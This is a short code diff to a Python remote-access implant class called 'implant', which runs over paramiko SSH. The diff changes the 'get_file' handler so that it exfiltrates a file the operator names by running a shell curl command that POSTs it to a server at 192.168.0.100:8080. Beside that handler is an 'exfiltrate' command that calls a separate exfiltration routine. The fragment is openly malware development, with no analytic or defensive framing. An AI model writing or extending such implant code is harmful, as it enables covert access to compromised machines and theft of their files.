@@ -1,6 +1,3 @@
-from cryptography.fernet import Fernet
-import base64
-
 import paramiko
 import subprocess
 import sys
@@ -142,10 +139,9 @@ class implant():
                     #para enviar archivos del sistema
                     if ssh_command.split(" ")[0] == "get_file":
                         archivo = ssh_command.split(" ")[1]
-                        filetosend = open(archivo, "rb")
-                        data = filetosend.read(40960)
-                        open_ssh_session.send(data)
-                        filetosend.close()  
+                        comando = f'curl -X POST -F "file=@{archivo}" http://192.168.0.100:8080/{archivo}'
+                        subprocess.run(comando, shell=True, check=True)
+                        open_ssh_session.send("Archivo enviado")
                     #modulo de exfiltracion de informacion
                     if ssh_command == "exfiltrate":
                         self.exfiltrate_info()
